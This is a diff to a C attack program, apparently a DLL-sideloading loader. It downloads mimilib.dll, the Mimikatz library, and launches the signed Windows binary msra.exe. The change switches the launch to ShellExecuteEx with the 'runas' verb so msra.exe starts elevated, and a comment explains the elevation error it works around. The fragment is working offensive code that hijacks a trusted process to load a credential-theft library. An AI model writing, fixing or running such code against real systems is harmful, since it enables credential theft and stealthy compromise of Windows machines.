@@ -130,14 +130,19 @@ int main(void) {
     else
         printf("[+] mimilib.dll downloaded\n");
 
-    STARTUPINFOA si = { .cb = sizeof(si) };
-    PROCESS_INFORMATION pi;
-    if (CreateProcessA(targetMsra, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        printf("[+] msra.exe launched (PID: %lu)\n", pi.dwProcessId);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+    // ponytail: 740 = ERROR_ELEVATION_REQUIRED; msra.exe has a requireAdministrator
+    // manifest, so plain CreateProcess fails. ShellExecuteEx "runas" satisfies it
+    // (no prompt when caller is already elevated).
+    SHELLEXECUTEINFOA sei = { .cbSize = sizeof(sei) };
+    sei.lpFile = targetMsra;
+    sei.nShow = SW_SHOW;
+    sei.lpVerb = "runas";
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+    if (ShellExecuteExA(&sei) && sei.hProcess) {
+        printf("[+] msra.exe launched (PID: %lu)\n", GetProcessId(sei.hProcess));
+        CloseHandle(sei.hProcess);
     } else {
-        printf("[-] Failed to launch msra.exe (%lu)\n", GetLastError());
+        printf("[-] Failed to launch msra.exe (0x%lx)\n", (DWORD)(DWORD_PTR)sei.hInstApp);
     }
 
     printf("Press 'q' to exit\n");
